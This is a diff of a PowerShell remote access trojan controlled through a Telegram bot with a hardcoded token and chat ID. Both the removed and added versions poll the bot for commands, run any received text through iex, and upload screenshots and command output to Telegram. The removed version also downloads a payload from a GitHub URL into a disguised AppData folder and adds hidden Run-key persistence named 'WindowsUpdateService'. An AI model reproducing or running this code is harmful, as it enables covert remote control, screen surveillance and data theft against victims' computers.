@@ -1,8 +1,51 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
-$b="https://api.telegram.org/bot8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88";$i="6494641721";
-function s($t){try{$k=@{chat_id=$i;text="[$env:COMPUTERNAME] $t"};Invoke-RestMethod -Uri "$b/sendMessage" -Method Post -Body $k -Proxy $null}catch{}};
-if(!(Test-Path "$env:APPDATA\WindowsNT")){mkdir "$env:APPDATA\WindowsNT"|Out-Null};
-$p="$env:APPDATA\WindowsNT\svchost_task.ps1";
-if($PSCommandPath -ne $p){(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tidomail13719-art/safe-test-/main/test',$p);Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateService' -Value "powershell.exe -W Hidden -NoP -EBy Bypass -File `"$p`""};
-s "🚀 Agent Online! Network bypass active.";$l=0;
-while(1){try{$u=Invoke-RestMethod -Uri "$b/getUpdates?offset=$($l+1)&timeout=20" -Proxy $null;foreach($v in $u.result){$l=$v.update_id;$cmd=$v.message.text;if($v.message.from.id -eq $i){if($cmd -eq 'shot'){Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$f=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$m=New-Object Drawing.Bitmap($f.Width,$f.Height);$g=[Drawing.Graphics]::FromImage($m);$g.CopyFromScreen($f.X,$f.Y,0,0,$f.Size);$temp="$env:TEMP\r.png";$m.Save($temp,[Drawing.Imaging.ImageFormat]::Png);$g.Dispose();$m.Dispose();curl.exe -x "" -F "chat_id=$i" -F "photo=@$temp" "$b/sendPhoto";rm $temp}else{try{$o=iex $cmd 2>&1|Out-String;s $o}catch{}}}}}catch{sleep 7}}
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
+$chatId = "6494641721"
+$apiUrl = "https://api.telegram.org/bot$botToken"
+
+function Send-TG ($t, $isPath=$false) {
+    if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
+    else {
+        $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
+        Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -Proxy $null
+    }
+}
+
+Send-TG "🚀 *Агент запущен!*`nНапиши /help для списка команд."
+$lastId = 0
+
+while ($true) {
+    try {
+        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -Proxy $null
+        foreach ($u in $res.result) {
+            $lastId = $u.update_id
+            $msg = $u.message.text
+            if ($u.message.from.id -eq $chatId) {
+                switch ($msg) {
+                    "/start" { Send-TG "✅ Система готова к приему команд." }
+                    "/help"  { Send-TG "📜 *Команды:*`n`n🔹 *shot* - скриншот`n🔹 *kill* - выключить`n🔹 *команда* - выполнить в PS" }
+                    "shot" {
+                        Send-TG "📸 Делаю снимок..."
+                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+                        $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+                        $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
+                        $g = [Drawing.Graphics]::FromImage($b)
+                        $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
+                        $tmp = "$env:TEMP\s.png"; $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
+                        $g.Dispose(); $b.Dispose()
+                        Send-TG $tmp $true
+                        if(Test-Path $tmp){ rm $tmp }
+                    }
+                    "kill" { Send-TG "💀 Завершаю работу."; exit }
+                    default {
+                        try {
+                            $out = iex $msg 2>&1 | Out-String
+                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "✅ Выполнено" } else { "🖥 *Ответ:*`n$out" }
+                            Send-TG $resOut
+                        } catch { Send-TG "❌ Ошибка: $($_.Exception.Message)" }
+                    }
+                }
+            }
+        }
+    } catch { Start-Sleep -Seconds 5 }
+}
